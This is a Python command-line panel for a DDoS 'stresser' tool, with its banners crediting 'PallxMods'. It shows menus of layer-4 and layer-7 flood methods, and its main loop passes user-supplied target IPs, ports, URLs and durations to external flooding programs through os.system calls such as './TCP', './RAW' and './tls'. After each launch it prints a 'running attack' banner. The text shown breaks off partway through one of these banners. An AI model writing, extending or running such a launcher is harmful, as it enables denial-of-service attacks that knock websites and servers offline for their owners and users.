# -*- coding: utf-8 -*-
from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
from colorama import Fore, Back
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs

B = '\033[35m' #MERAH
P = '\033[1;37m' #PUTIH

def layer7():
	os.system ("clear")
	print("""\033[96m
       				   ╔═══════════╗
			         ╔═╝███████████╚═╗
			        ╔╝███████████████╚╗ 
			        ║█████████████████║ 
		                ║█████████████████║ 
			        ║█████████████████║
			        ║█╔█████████████╗█║ 
			        ╚╦╝███▒▒███▒▒███╚╦╝ 
			        ╔╝██▒▒▒▒███▒▒▒▒██╚╗ 
			        ║██▒▒▒▒▒███▒▒▒▒▒██║ 
			        ║██▒▒▒▒█████▒▒▒▒██║ 
			        ╚╗███████████████╔╝
			       ╔═╬══╦╝██▒█▒██╚╦══╝.▒.. 
			       ║█║══║█████████║　...▒.  
			       ║█║══║█║██║██║█║　.▒..
			       ║█║══╚═╩══╩╦═╩═╩═╦╗▒.  
			      ╔╝█╚══╦═╦══╦╩═╦═╦═╩╝
			     ╔╝████║█║██║██║█║
			     ║█████║█████████║
\033[35m             ╚╦════════════════════════════════════════════╦╝
\033[35m        ╔═════╩════════════════════════════════════════════╩═════╗
\033[37m                             [ LAYER - 7 ]
\033[48m          [ ADMIN : Pallxmods ]
\033[48m          [ TELEGRAM : @gwbaik ]
\033[35m        ╚════════════════════════════════════════════════════════╝
\033[93m          NOTE USE:
                  method [GET/POST]       thread [6000-15000]
                  con    [100-500]        req    [5-8]
                  ------------------------------------------
         \033[92m         • BOMB2 [url] [time] [method]
                  • BOMB [url] [time] [method]
                  • GOLDEN [url] [w] [con]
                  • TLS [url] [time] [req]
                  • TLSV2 [url] [time] [req]
                  • ZLOCRY [url] [time] [req]

""")

def layer12():
	os.system ("clear")
	print("""\033[96m
				   ╔═══════════╗
                                 ╔═╝███████████╚═╗
                                ╔╝███████████████╚╗
                                ║█████████████████║
                                ║█████████████████║
                                ║█████████████████║
                                ║█╔█████████████╗█║
                                ╚╦╝███▒▒███▒▒███╚╦╝
                                ╔╝██▒▒▒▒███▒▒▒▒██╚╗
                                ║██▒▒▒▒▒███▒▒▒▒▒██║
                                ║██▒▒▒▒█████▒▒▒▒██║
                                ╚╗███████████████╔╝
                               ╔═╬══╦╝██▒█▒██╚╦══╝.▒..
                               ║█║══║█████████║　...▒.
                               ║█║══║█║██║██║█║　.▒..
                               ║█║══╚═╩══╩╦═╩═╩═╦╗▒.
                              ╔╝█╚══╦═╦══╦╩═╦═╦═╩╝
                             ╔╝████║█║██║██║█║
                             ║█████║█████████║
\033[35m             ╚╦════════════════════════════════════════════╦╝
\033[35m        ╔═════╩════════════════════════════════════════════╩═════╗
\033[37m                             [ LAYER - 12 ]
\033[48m          [ ADMIN : PallxMods ]
\033[48m          [ TELEGRAM : @gwbaik ]
\033[35m        ╚════════════════════════════════════════════════════════╝
\033[92m                  USE FOR BOT COUNT

\033[93m                  • BRUTAL [url] [time]
                  • BOT [url] [time]

""")

def VVIP():
	os.system ("clear")
	print("""\033[96m
				   ╔═══════════╗
                                 ╔═╝███████████╚═╗
                                ╔╝███████████████╚╗
                                ║█████████████████║
                                ║█████████████████║
                                ║█████████████████║
                                ║█╔█████████████╗█║
                                ╚╦╝███▒▒███▒▒███╚╦╝
                                ╔╝██▒▒▒▒███▒▒▒▒██╚╗
                                ║██▒▒▒▒▒███▒▒▒▒▒██║
                                ║██▒▒▒▒█████▒▒▒▒██║
                                ╚╗███████████████╔╝
                               ╔═╬══╦╝██▒█▒██╚╦══╝.▒..
                               ║█║══║█████████║　...▒.
                               ║█║══║█║██║██║█║　.▒..
                               ║█║══╚═╩══╩╦═╩═╩═╦╗▒.
                              ╔╝█╚══╦═╦══╦╩═╦═╦═╩╝
                             ╔╝████║█║██║██║█║
                             ║█████║█████████║
\033[35m             ╚╦════════════════════════════════════════════╦╝
\033[35m        ╔═════╩════════════════════════════════════════════╩═════╗
\033[37m                             [ VVIP ]
\033[48m          [ ADMIN : PallxMods ]
\033[48m          [ TELEGRAM : @gwbaik ]
\033[35m        ╚════════════════════════════════════════════════════════╝
\033[92m                  USE FOR BOT COUNT

\033[93m                  • HTTPS [url] [time]
                  • HTTP [url] [time]
""")

def layer4():
	os.system ("clear")
	print("""\033[96m
				   ╔═══════════╗
                                 ╔═╝███████████╚═╗
                                ╔╝███████████████╚╗
                                ║█████████████████║
                                ║█████████████████║
                                ║█████████████████║
                                ║█╔█████████████╗█║
                                ╚╦╝███▒▒███▒▒███╚╦╝
                                ╔╝██▒▒▒▒███▒▒▒▒██╚╗
                                ║██▒▒▒▒▒███▒▒▒▒▒██║
                                ║██▒▒▒▒█████▒▒▒▒██║
                                ╚╗███████████████╔╝
                               ╔═╬══╦╝██▒█▒██╚╦══╝.▒..
                               ║█║══║█████████║　...▒.
                               ║█║══║█║██║██║█║　.▒..
                               ║█║══╚═╩══╩╦═╩═╩═╦╗▒.
                              ╔╝█╚══╦═╦══╦╩═╦═╦═╩╝
                             ╔╝████║█║██║██║█║
                             ║█████║█████████║
\033[35m             ╚╦════════════════════════════════════════════╦╝
\033[35m        ╔═════╩════════════════════════════════════════════╩═════╗
\033[37m                             [ LAYER - 4 ]
\033[48m          [ ADMIN : PallxMods ]
\033[48m          [ TELEGRAM : @gwbaik ]
\033[35m        ╚════════════════════════════════════════════════════════╝
\033[92m                  NOTE USE:
                  mode   [1/2/3]
                  method [GET/POST/HEAD]
            

\033[93m                  • STRESS [ip] [port] [mode] [time]
                  • TCP [ip] [port] [time] [method]
                  • OVH [ip] [port] [time] [method]


""")

def help():
	os.system ("clear")
	print("""\033[96m
                                   ╔═══════════╗
                                 ╔═╝███████████╚═╗
                                ╔╝███████████████╚╗
                                ║█████████████████║
                                ║█████████████████║
                                ║█████████████████║
                                ║█╔█████████████╗█║
                                ╚╦╝███▒▒███▒▒███╚╦╝
                                ╔╝██▒▒▒▒███▒▒▒▒██╚╗
                                ║██▒▒▒▒▒███▒▒▒▒▒██║
                                ║██▒▒▒▒█████▒▒▒▒██║
                                ╚╗███████████████╔╝
                               ╔═╬══╦╝██▒█▒██╚╦══╝.▒..
                               ║█║══║█████████║　...▒.
                               ║█║══║█║██║██║█║　.▒..
                               ║█║══╚═╩══╩╦═╩═╩═╦╗▒.
                              ╔╝█╚══╦═╦══╦╩═╦═╦═╩╝
                             ╔╝████║█║██║██║█║
                             ║█████║█████████║
\033[35m             ╚╦════════════════════════════════════════════╦╝
\033[35m        ╔═════╩════════════════════════════════════════════╩═════╗
\033[37m                             [ MENU RIZZSTRESSER ]
\033[48m          [ ADMIN : PallxMods ]
\033[48m          [ TELEGRAM : @gwbaik ]
\033[35m        ╚════════════════════════════════════════════════════════╝
\033[93m           You can choose by typing L7.  L4. L12. VVIP
\033[92m

                  [ Layer-7 ]            Note!!⚠️ : Jika ada kerusakan Admin
		  • FXX[VIP]                      tidak bertanggung jawab
		  • BOMB2                laporkan Bug Chat admin di Telegram : @Rizz371
		  • BOMB
		  • TLS[VIP]
		  • TLSV2
		  • ZLOCRY

		  [ Layer-4 ]
		  • STERSS
		  • TCP
		  • OVH

		  [ LAYER-12 ]
		  • BRUTAL
		  • BOT

		  [ VVIP ]
		  • HTTPS[VIP]
		  • HTTP
""")

def menu():
    os.system ("clear")
    print("""\033[96m
				   ╔═══════════╗
                                 ╔═╝███████████╚═╗
                                ╔╝███████████████╚╗
                                ║█████████████████║
                                ║█████████████████║
                                ║█████████████████║
                                ║█╔█████████████╗█║
                                ╚╦╝███▒▒███▒▒███╚╦╝
                                ╔╝██▒▒▒▒███▒▒▒▒██╚╗
                                ║██▒▒▒▒▒███▒▒▒▒▒██║
                                ║██▒▒▒▒█████▒▒▒▒██║
                                ╚╗███████████████╔╝
                               ╔═╬══╦╝██▒█▒██╚╦══╝.▒..
                               ║█║══║█████████║　...▒.
                               ║█║══║█║██║██║█║　.▒..
                               ║█║══╚═╩══╩╦═╩═╩═╦╗▒.
                              ╔╝█╚══╦═╦══╦╩═╦═╦═╩╝
                             ╔╝████║█║██║██║█║
                             ║█████║█████████║
\033[35m             ╚╦════════════════════════════════════════════╦╝
\033[35m        ╔═════╩════════════════════════════════════════════╩═════╗
\033[37m                             [ menu Utama ]
\033[48m          [ ADMIN : PallxMods ]
\033[48m          [ TELEGRAM : @gwbaik ]
\033[48m           [ WELCOME TO : PallxMods ]
\033[35m        ╚════════════════════════════════════════════════════════╝
\x1b[1;37m                      type 'help'
""")



def main():

	while True:
		sys.stdout.write(f"\x1b]2;[/] PallxMods Pannel :: Welcome, root :: Online 1 :: Running: 0/10\x07")
		sin = input("\033[0;30;46mPallxMods @ PANEL\x1b[1;37m\033[0m:~# \x1b[1;37m\033[0m ")
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			menu()
		if sinput == "cls":
			os.system ("clear")
			menu()
		if sinput == "layer12" or sinput == "l12" or sinput == ".layer12" or sinput == "LAYER12" or sinput == ".LAYER12" or sinput == "L12":
			layer12()
		if sinput == "vvip" or sinput == "vip" or sinput == ".vvip" or sinput == "VVIP" or sinput == ".VVIP" or sinput == "VIP":
			VVIP()
		if sinput == "layer7" or sinput == "l7" or sinput == ".layer7" or sinput == "LAYER7" or sinput == ".LAYER7" or sinput == "L7":
			layer7()
		if sinput == "layer4" or sinput == "l4" or sinput == ".layer4" or sinput == "LAYER4" or sinput == ".LAYER4" or sinput == "L4":
			layer4()
		if sinput == "help" or sinput == "HELP" or sinput == ".help" or sinput == ".HELP" or sinput == "menu" or sinput == ".menu" or sinput == "MENU" or sinput == ".MENU":
			help()
		if sinput == "plan":
			plant()
		elif sinput == "":
			main()

#########LAYER-4########
		elif sinput == "stress" or sinput == "STRESS":
			try:
				ip = sin.split()[1]
				port = sin.split()[2]
				method = sin.split()[3]
				time = sin.split()[4]
				os.system(f'cd resources && go run stress.go {ip} {port} {method} 1250 {time} 5')
				os.system ("clear")
				print(f"""\033[92m
               ;;;;;;;;;'',,.,lllc,.',,,'',;clllc,...'.c.. ,;;;;;;;
               kkkkkkloxKNKOkkOXN0KXKOkO00OkddddkNN0dl:ld'.,lkkkkkk
               kkkxcdKWXkok0XNWWWWWWWXKkOkONWWWNKkO000lco:..'.okkkk
               xo;dNWXdx0NWKWWWWWWWWWWWNO0KxkNWWWWWNXxoOl.',,,';dkk
               coXWNkkNWWW0KWWWWWWWWWWWWWXxXKoKWWWWWNk0Nd.o:...,::x
               0WNKkNWWWWWoWWWWWWWWWWWWNNWNoKNokNNNNNO0Ol,,;''c.l;.
               WNOOWWWWWWNlWWNNWWWWWWWNNNNNNcKNdxXNNNKOkolcllc:o.,,
               XO0WWWWWWWNlWWNXNNNNNNNNN0NNNXcXNoxXNNNXXXOOOkkxollc
               O0WWWWWWWWNlNNNXNNNNNNNNNKkNNNxdKX,cxO0XNXXOxNXOxc;;
               0WWWWNNNNNXkdNNNKNNNNNNNNNkONNN'oKXcookOXNXX0dXklk;.
               NNNNNNNXNXNlokKK00NNNXNNNNNx0NNcklxKlOxddkXNXKoKl,::
               NNNNNNXNXX0;xlxNNo0XNNXNNNNNxOXcOKkodldKXOxdxxx:llod
               NNNNNXXkKX,O00xdXXcdKXNXXNNNNkd:0NNNXOklcxOkkkOO,d'x
               NNNXKKdKXlx0NNX0dxKo:okKXKKXNNKd0NNk:'..        ,,',
               NXKKxdKKod0NNNNXXKkkdoxoodxOKXXN0kKOXOWK;c.......kNN
               KKxoOKKcd0NNNNOxoc:ck0k0NNX0kkOO00k0NKook0xxxxxxd'WW
               kdo0KkckK0o;.   ...:KNNNNNNNNNNNNNNNNNO000000000OO00
               NKlkc:c;.'c:...;O;;;dNNNNNNNNNNNNNNNNNNNNNNXXXKKKKKk
               NN,::.,dKWNd.;lO0dkkONNNNNNNNNNNNNNNNNNNNNNNXXKOkkkX
               NNO.lKNWW0'xkkO00XNNNNNNNNNNNNONNNNNNNNNNNNNNXXKOkkk
               NNNx'OWWNKcO0XNNNNNNNNNNNNNNNokdxNNNNNNNNNNNNNNNNNNN
               XXNN0loKXXKXXXXNNNNNNNNNNNNNKKNNXNNNNNNNNNNNNNNNNNNN
               KKKXNN0xxxKXXXXNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
               0KK0KKKKKKkxkxdlxXNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
               lO0000xxOkdoodkNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNKkoc
               k.:d000OocldkkxNNNNNNNNNNNNNNNNNNNNNNNNNNNN0kdl;ldxc
\033[1;37m                                •|⚠️running attack|•
\033[35m           __________________________________________________________
\033[35m
\033[1;37m                   IP       : \033[92m[ \033[1;37m{ip}  \033[92m]
\033[1;37m                   PORT     :\033[92m [\033[1;37m {port}\033[92m ]
\033[1;37m                   METHOD   :\033[92m [ \033[1;37m{method} \033[92m]
\033[1;37m                   LAYER-4  :\033[92m [ \033[1;37mSTRESSER\033[92m ]
\033[1;37m                  VIP      : \033[92m[ \033[32mTrue \033[92m]
\033[1;37m                   USER     : \033[92m[ \033[1;37mAdmin\033[92m ]
\033[35m           __________________________________________________________
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "tcp" or sinput == "TCP":
			try:
				ip = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				method = sin.split()[4]
				os.system(f'cd resources && ./TCP {method} {ip} {port} {time} 15000')
				os.system ("clear")
				print(f"""\033[92m
               ;;;;;;;;;'',,.,lllc,.',,,'',;clllc,...'.c.. ,;;;;;;;
               kkkkkkloxKNKOkkOXN0KXKOkO00OkddddkNN0dl:ld'.,lkkkkkk
               kkkxcdKWXkok0XNWWWWWWWXKkOkONWWWNKkO000lco:..'.okkkk
               xo;dNWXdx0NWKWWWWWWWWWWWNO0KxkNWWWWWNXxoOl.',,,';dkk
               coXWNkkNWWW0KWWWWWWWWWWWWWXxXKoKWWWWWNk0Nd.o:...,::x
               0WNKkNWWWWWoWWWWWWWWWWWWNNWNoKNokNNNNNO0Ol,,;''c.l;.
               WNOOWWWWWWNlWWNNWWWWWWWNNNNNNcKNdxXNNNKOkolcllc:o.,,
               XO0WWWWWWWNlWWNXNNNNNNNNN0NNNXcXNoxXNNNXXXOOOkkxollc
               O0WWWWWWWWNlNNNXNNNNNNNNNKkNNNxdKX,cxO0XNXXOxNXOxc;;
               0WWWWNNNNNXkdNNNKNNNNNNNNNkONNN'oKXcookOXNXX0dXklk;.
               NNNNNNNXNXNlokKK00NNNXNNNNNx0NNcklxKlOxddkXNXKoKl,::
               NNNNNNXNXX0;xlxNNo0XNNXNNNNNxOXcOKkodldKXOxdxxx:llod
               NNNNNXXkKX,O00xdXXcdKXNXXNNNNkd:0NNNXOklcxOkkkOO,d'x
               NNNXKKdKXlx0NNX0dxKo:okKXKKXNNKd0NNk:'..        ,,',
               NXKKxdKKod0NNNNXXKkkdoxoodxOKXXN0kKOXOWK;c.......kNN
               KKxoOKKcd0NNNNOxoc:ck0k0NNX0kkOO00k0NKook0xxxxxxd'WW
               kdo0KkckK0o;.   ...:KNNNNNNNNNNNNNNNNNO000000000OO00                                     NKlkc:c;.'c:...;O;;;dNNNNNNNNNNNNNNNNNNNNNNXXXKKKKKk
               NN,::.,dKWNd.;lO0dkkONNNNNNNNNNNNNNNNNNNNNNNXXKOkkkX
               NNO.lKNWW0'xkkO00XNNNNNNNNNNNNONNNNNNNNNNNNNNXXKOkkk
               NNNx'OWWNKcO0XNNNNNNNNNNNNNNNokdxNNNNNNNNNNNNNNNNNNN
               XXNN0loKXXKXXXXNNNNNNNNNNNNNKKNNXNNNNNNNNNNNNNNNNNNN
               KKKXNN0xxxKXXXXNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
               0KK0KKKKKKkxkxdlxXNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
               lO0000xxOkdoodkNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNKkoc
               k.:d000OocldkkxNNNNNNNNNNNNNNNNNNNNNNNNNNNN0kdl;ldxc
\033[1;37m                                •|⚠️running attack|•
\033[35m           __________________________________________________________
\033[35m
\033[1;37m                   IP       : \033[92m[ \033[1;37m{ip}  \033[92m]
\033[1;37m                   PORT     :\033[92m [\033[1;37m {port}\033[92m ]
\033[1;37m                   METHOD   :\033[92m [ \033[1;37m{method} \033[92m]
\033[1;37m                   TIME     :\033[92m [\033[1;37m {time}\033[92m ]
\033[1;37m                   LAYER-4  :\033[92m [ \033[1;37mTCP\033[92m ]
\033[1;37m                   VIP      : \033[92m[ \033[32mTrue \033[92m]
\033[1;37m                   USER     : \033[92m[ \033[1;37mAdmin\033[92m ]
\033[35m           __________________________________________________________
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "ovh" or sinput == "OVH":
			try:
				ip = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				method = sin.split()[4]
				os.system(f'cd resources && ./RAW {method} {ip} {port} {time} 15000')
				os.system ("clear")
				print(f"""\033[92m
               ;;;;;;;;;'',,.,lllc,.',,,'',;clllc,...'.c.. ,;;;;;;;
               kkkkkkloxKNKOkkOXN0KXKOkO00OkddddkNN0dl:ld'.,lkkkkkk
               kkkxcdKWXkok0XNWWWWWWWXKkOkONWWWNKkO000lco:..'.okkkk
               xo;dNWXdx0NWKWWWWWWWWWWWNO0KxkNWWWWWNXxoOl.',,,';dkk
               coXWNkkNWWW0KWWWWWWWWWWWWWXxXKoKWWWWWNk0Nd.o:...,::x
               0WNKkNWWWWWoWWWWWWWWWWWWNNWNoKNokNNNNNO0Ol,,;''c.l;.
               WNOOWWWWWWNlWWNNWWWWWWWNNNNNNcKNdxXNNNKOkolcllc:o.,,
               XO0WWWWWWWNlWWNXNNNNNNNNN0NNNXcXNoxXNNNXXXOOOkkxollc
               O0WWWWWWWWNlNNNXNNNNNNNNNKkNNNxdKX,cxO0XNXXOxNXOxc;;
               0WWWWNNNNNXkdNNNKNNNNNNNNNkONNN'oKXcookOXNXX0dXklk;.
               NNNNNNNXNXNlokKK00NNNXNNNNNx0NNcklxKlOxddkXNXKoKl,::
               NNNNNNXNXX0;xlxNNo0XNNXNNNNNxOXcOKkodldKXOxdxxx:llod
               NNNNNXXkKX,O00xdXXcdKXNXXNNNNkd:0NNNXOklcxOkkkOO,d'x
               NNNXKKdKXlx0NNX0dxKo:okKXKKXNNKd0NNk:'..        ,,',
               NXKKxdKKod0NNNNXXKkkdoxoodxOKXXN0kKOXOWK;c.......kNN
               KKxoOKKcd0NNNNOxoc:ck0k0NNX0kkOO00k0NKook0xxxxxxd'WW
               kdo0KkckK0o;.   ...:KNNNNNNNNNNNNNNNNNO000000000OO00                                     NKlkc:c;.'c:...;O;;;dNNNNNNNNNNNNNNNNNNNNNNXXXKKKKKk
               NN,::.,dKWNd.;lO0dkkONNNNNNNNNNNNNNNNNNNNNNNXXKOkkkX
               NNO.lKNWW0'xkkO00XNNNNNNNNNNNNONNNNNNNNNNNNNNXXKOkkk
               NNNx'OWWNKcO0XNNNNNNNNNNNNNNNokdxNNNNNNNNNNNNNNNNNNN
               XXNN0loKXXKXXXXNNNNNNNNNNNNNKKNNXNNNNNNNNNNNNNNNNNNN
               KKKXNN0xxxKXXXXNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
               0KK0KKKKKKkxkxdlxXNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
               lO0000xxOkdoodkNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNKkoc
               k.:d000OocldkkxNNNNNNNNNNNNNNNNNNNNNNNNNNNN0kdl;ldxc
\033[1;37m                                •|⚠️running attack|•
\033[94m           __________________________________________________________
\033[94m
\033[1;37m                   IP       : \033[92m[ \033[1;37m{ip}  \033[92m]
\033[1;37m                   PORT     :\033[92m [\033[1;37m {port}\033[92m ]
\033[1;37m                   METHOD   :\033[92m [ \033[1;37m{method} \033[92m]
\033[1;37m                   TIME     :\033[92m [\033[1;37m {time}\033[92m ]
\033[1;37m                   LAYER-4  :\033[92m [ \033[1;37mOVH\033[92m ]
\033[1;37m                   VIP      : \033[92m[ \033[32mTrue \033[92m]
\033[1;37m                   USER     : \033[92m[ \033[1;37mAdmin\033[95m ]
\033[94m           __________________________________________________________
""")
			except ValueError:
				main()
			except IndexError:
				main()

#########LAYER-7#########

		elif sinput == "tls" or sinput == "TLS":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				req = sin.split()[3]
				os.system(f'cd godzilla && ./tls {url} {time} {req} 6')
				os.system ("clear")
				print(f"""\033[92m
               ;;;;;;;;;'',,.,lllc,.',,,'',;clllc,...'.c.. ,;;;;;;;
               kkkkkkloxKNKOkkOXN0KXKOkO00OkddddkNN0dl:ld'.,lkkkkkk
               kkkxcdKWXkok0XNWWWWWWWXKkOkONWWWNKkO000lco:..'.okkkk
               xo;dNWXdx0NWKWWWWWWWWWWWNO0KxkNWWWWWNXxoOl.',,,';dkk
               coXWNkkNWWW0KWWWWWWWWWWWWWXxXKoKWWWWWNk0Nd.o:...,::x
               0WNKkNWWWWWoWWWWWWWWWWWWNNWNoKNokNNNNNO0Ol,,;''c.l;.
               WNOOWWWWWWNlWWNNWWWWWWWNNNNNNcKNdxXNNNKOkolcllc:o.,,
               XO0WWWWWWWNlWWNXNNNNNNNNN0NNNXcXNoxXNNNXXXOOOkkxollc
               O0WWWWWWWWNlNNNXNNNNNNNNNKkNNNxdKX,cxO0XNXXOxNXOxc;;
               0WWWWNNNNNXkdNNNKNNNNNNNNNkONNN'oKXcookOXNXX0dXklk;.
               NNNNNNNXNXNlokKK00NNNXNNNNNx0NNcklxKlOxddkXNXKoKl,::
               NNNNNNXNXX0;xlxNNo0XNNXNNNNNxOXcOKkodldKXOxdxxx:llod
               NNNNNXXkKX,O00xdXXcdKXNXXNNNNkd:0NNNXOklcxOkkkOO,d'x
               NNNXKKdKXlx0NNX0dxKo:okKXKKXNNKd0NNk:'..        ,,',
               NXKKxdKKod0NNNNXXKkkdoxoodxOKXXN0kKOXOWK;c.......kNN
               KKxoOKKcd0NNNNOxoc:ck0k0NNX0kkOO00k0NKook0xxxxxxd'WW
               kdo0KkckK0o;.   ...:KNNNNNNNNNNNNNNNNNO000000000OO00                                     NKlkc:c;.'c:...;O;;;dNNNNNNNNNNNNNNNNNNNNNNXXXKKKKKk
               NN,::.,dKWNd.;lO0dkkONNNNNNNNNNNNNNNNNNNNNNNXXKOkkkX
               NNO.lKNWW0'xkkO00XNNNNNNNNNNNNONNNNNNNNNNNNNNXXKOkkk
               NNNx'OWWNKcO0XNNNNNNNNNNNNNNNokdxNNNNNNNNNNNNNNNNNNN
               XXNN0loKXXKXXXXNNNNNNNNNNNNNKKNNXNNNNNNNNNNNNNNNNNNN
               KKKXNN0xxxKXXXXNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
               0KK0KKKKKKkxkxdlxXNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
               lO0000xxOkdoodkNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNKkoc
               k.:d000OocldkkxNNNNNNNNNNNNNNNNNNNNNNNNNNNN0kdl;ldxc
\033[1;37m                                •|⚠️running attack|•
\033[94m           __________________________________________________________
\033[94m
\033[1;37m                   TARGET   : \033[92m[ \033[1;37m{url}  \033[92m]
\033[1;37m                   TIME     :\033[92m [\033[1;37m {time}\033[92m ]
\033[1;37m                   REQUEST   :\033[92m [ \033[1;37m{req} \033[92m]
\033[1;37m                   LAYER-7  :\033[92m [ \033[1;37mTLS\033[92m ]
\033[1;37m                   VIP      : \033[92m[ \033[32mTrue \033[92m ]
\033[1;37m                   USER     : \033[92m[ \033[1;37mAdmin\033[92m ]
\033[94m           __________________________________________________________
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "bot" or sinput == "BOT":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd resources && node count.js {url} 40 {time}')
				os.system ("clear")
				print(f"""\033[92m
               ;;;;;;;;;'',,.,lllc,.',,,'',;clllc,...'.c.. ,;;;;;;;
               kkkkkkloxKNKOkkOXN0KXKOkO00OkddddkNN0dl:ld'.,lkkkkkk
               kkkxcdKWXkok0XNWWWWWWWXKkOkONWWWNKkO000lco:..'.okkkk
               xo;dNWXdx0NWKWWWWWWWWWWWNO0KxkNWWWWWNXxoOl.',,,';dkk
               coXWNkkNWWW0KWWWWWWWWWWWWWXxXKoKWWWWWNk0Nd.o:...,::x
               0WNKkNWWWWWoWWWWWWWWWWWWNNWNoKNokNNNNNO0Ol,,;''c.l;.
               WNOOWWWWWWNlWWNNWWWWWWWNNNNNNcKNdxXNNNKOkolcllc:o.,,
               XO0WWWWWWWNlWWNXNNNNNNNNN0NNNXcXNoxXNNNXXXOOOkkxollc
               O0WWWWWWWWNlNNNXNNNNNNNNNKkNNNxdKX,cxO0XNXXOxNXOxc;;
               0WWWWNNNNNXkdNNNKNNNNNNNNNkONNN'oKXcookOXNXX0dXklk;.
               NNNNNNNXNXNlokKK00NNNXNNNNNx0NNcklxKlOxddkXNXKoKl,::
               NNNNNNXNXX0;xlxNNo0XNNXNNNNNxOXcOKkodldKXOxdxxx:llod
               NNNNNXXkKX,O00xdXXcdKXNXXNNNNkd:0NNNXOklcxOkkkOO,d'x
               NNNXKKdKXlx0NNX0dxKo:okKXKKXNNKd0NNk:'..        ,,',
               NXKKxdKKod0NNNNXXKkkdoxoodxOKXXN0kKOXOWK;c.......kNN
               KKxoOKKcd0NNNNOxoc:ck0k0NNX0kkOO00k0NKook0xxxxxxd'WW
               kdo0KkckK0o;.   ...:KNNNNNNNNNNNNNNNNNO000000000OO00                                     NKlkc:c;.'c:...;O;;;dNNNNNNNNNNNNNNNNNNNNNNXXXKKKKKk
               NN,::.,dKWNd.;lO0dkkONNNNNNNNNNNNNNNNNNNNNNNXXKOkkkX
               NNO.lKNWW0'xkkO00XNNNNNNNNNNNNONNNNNNNNNNNNNNXXKOkkk
               NNNx'OWWNKcO0XNNNNNNNNNNNNNNNokdxNNNNNNNNNNNNNNNNNNN
               XXNN0loKXXKXXXXNNNNNNNNNNNNNKKNNXNNNNNNNNNNNNNNNNNNN
               KKKXNN0xxxKXXXXNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
               0KK0KKKKKKkxkxdlxXNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
               lO0000xxOkdoodkNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNKkoc
               k.:d000OocldkkxNNNNNNNNNNNNNNNNNNNNNNNNNNNN0kdl;ldxc
\033[1;37m                                •|⚠️running attack|•
\033[94m           __________________________________________________________
\033[94m
\033[1;37m                   TARGET   : \033[92m[ \033[1;37m{url}  \033[92m]
\033[1;37m                   TIME     :\033[92m [\033[1;37m {time}\033[92m ]
\033[1;37m                   LAYER-12 :\033[92m [ \033[1;37mBOT\033[92m ]
\033[1;37m                   VIP      : \033[92m[ \033[32mTrue \033[92m]
\033[1;37m                   USER     : \033[92m[ \033[1;37mAdmin\033[92m ]
\033[94m           __________________________________________________________
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "brutal" or sinput == "BRUTAL":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd randomstring && python3 input.py {url} {time}')
				os.system ("clear")
				print(f"""\033[92m
	       ;;;;;;;;;'',,.,lllc,.',,,'',;clllc,...'.c.. ,;;;;;;;
               kkkkkkloxKNKOkkOXN0KXKOkO00OkddddkNN0dl:ld'.,lkkkkkk
               kkkxcdKWXkok0XNWWWWWWWXKkOkONWWWNKkO000lco:..'.okkkk
               xo;dNWXdx0NWKWWWWWWWWWWWNO0KxkNWWWWWNXxoOl.',,,';dkk
               coXWNkkNWWW0KWWWWWWWWWWWWWXxXKoKWWWWWNk0Nd.o:...,::x
               0WNKkNWWWWWoWWWWWWWWWWWWNNWNoKNokNNNNNO0Ol,,;''c.l;.
               WNOOWWWWWWNlWWNNWWWWWWWNNNNNNcKNdxXNNNKOkolcllc:o.,,
               XO0WWWWWWWNlWWNXNNNNNNNNN0NNNXcXNoxXNNNXXXOOOkkxollc
               O0WWWWWWWWNlNNNXNNNNNNNNNKkNNNxdKX,cxO0XNXXOxNXOxc;;
               0WWWWNNNNNXkdNNNKNNNNNNNNNkONNN'oKXcookOXNXX0dXklk;.
               NNNNNNNXNXNlokKK00NNNXNNNNNx0NNcklxKlOxddkXNXKoKl,::
               NNNNNNXNXX0;xlxNNo0XNNXNNNNNxOXcOKkodldKXOxdxxx:llod
               NNNNNXXkKX,O00xdXXcdKXNXXNNNNkd:0NNNXOklcxOkkkOO,d'x
               NNNXKKdKXlx0NNX0dxKo:okKXKKXNNKd0NNk:'..        ,,',
               NXKKxdKKod0NNNNXXKkkdoxoodxOKXXN0kKOXOWK;c.......kNN
               KKxoOKKcd0NNNNOxoc:ck0k0NNX0kkOO00k0NKook0xxxxxxd'WW
               kdo0KkckK0o;.   ...:KNNNNNNNNNNNNNNNNNO000000000OO00                                     NKlkc:c;.'c:...;O;;;dNNNNNNNNNNNNNNNNNNNNNNXXXKKKKKk
               NN,::.,dKWNd.;lO0dkkONNNNNNNNNNNNNNNNNNNNNNNXXKOkkkX
               NNO.lKNWW0'xkkO00XNNNNNNNNNNNNONNNNNNNNNNNNNNXXKOkkk
               NNNx'OWWNKcO0XNNNNNNNNNNNNNNNokdxNNNNNNNNNNNNNNNNNNN
               XXNN0loKXXKXXXXNNNNNNNNNNNNNKKNNXNNNNNNNNNNNNNNNNNNN
